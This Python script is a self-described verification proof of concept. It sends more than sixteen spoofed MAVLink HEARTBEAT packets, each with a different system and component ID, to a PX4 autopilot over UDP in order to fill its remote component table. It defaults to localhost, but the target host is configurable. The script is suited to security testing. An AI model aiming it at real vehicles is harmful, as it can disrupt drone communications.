#!/usr/bin/env python3
"""PX4 MAVLink remote component seen-table fill (verification PoC).

Goal:
- Send more than MAX_REMOTE_COMPONENTS distinct (sysid, compid) pairs.
- Corroborate that PX4 emits the warning: "Max remote components of 16 used up".

Safety:
- Localhost only.
- Sends only HEARTBEAT.

Output:
- Prints number of distinct pairs sent.

"""

from __future__ import annotations

import argparse
import socket
import time

from pymavlink.dialects.v10 import common as mavlink1


def pack_heartbeat(sysid: int, compid: int) -> bytes:
    out = bytearray()

    class _Buf:
        def write(self, b: bytes):
            out.extend(b)

    m = mavlink1.MAVLink(_Buf())
    m.srcSystem = sysid
    m.srcComponent = compid
    m.heartbeat_send(
        mavlink1.MAV_TYPE_GCS,
        mavlink1.MAV_AUTOPILOT_INVALID,
        0,
        0,
        mavlink1.MAV_STATE_ACTIVE,
    )
    return bytes(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="Verify PX4 remote component table fill")
    ap.add_argument("--target-host", default="127.0.0.1")
    ap.add_argument("--target-port", type=int, default=18570)
    ap.add_argument("--count", type=int, default=20, help="number of distinct (sysid,compid) heartbeats")
    ap.add_argument("--delay", type=float, default=0.02)
    args = ap.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", 0))

    sent = 0
    for i in range(args.count):
        sysid = 50 + i
        compid = 100 + i
        pkt = pack_heartbeat(sysid, compid)
        sock.sendto(pkt, (args.target_host, args.target_port))
        sent += 1
        time.sleep(args.delay)

    print(f"sent_distinct_pairs={sent} target=udp:{args.target_host}:{args.target_port}")
    print("NOTE: verify PX4 log contains: 'Max remote components of 16 used up'")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
